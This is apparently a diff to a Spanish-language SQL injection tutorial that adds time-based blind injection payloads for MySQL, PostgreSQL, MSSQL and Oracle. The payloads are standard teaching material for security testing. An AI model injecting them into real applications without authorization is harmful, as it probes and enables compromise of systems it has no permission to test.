@@ -136,8 +136,19 @@ En este tipo de inyección nos basaremos en errores en los códigos de respuesta
 
 
 ### Basada en retrasos temporales
-Lo primero que se debe de hacer es identificar la base de datos que se esta usando
+Lo primero que se debe de hacer es identificar la base de datos que se esta usando,
 
+#### MySQL
+Usaremos la query `' and sleep (10)-- -`
+
+#### PostgreSQL
+Usaremos la query `'||pg_sleep(10)-- -`
+
+#### MSSQL
+Usaremos la query `WAITFOR DELAY '0:0:10'-- -`
+
+#### Oracle
+Usaremos la query `dbms_pipe.receive_message(('a'),10)-- -`
 
 
 # Inyección basada en errores visibles
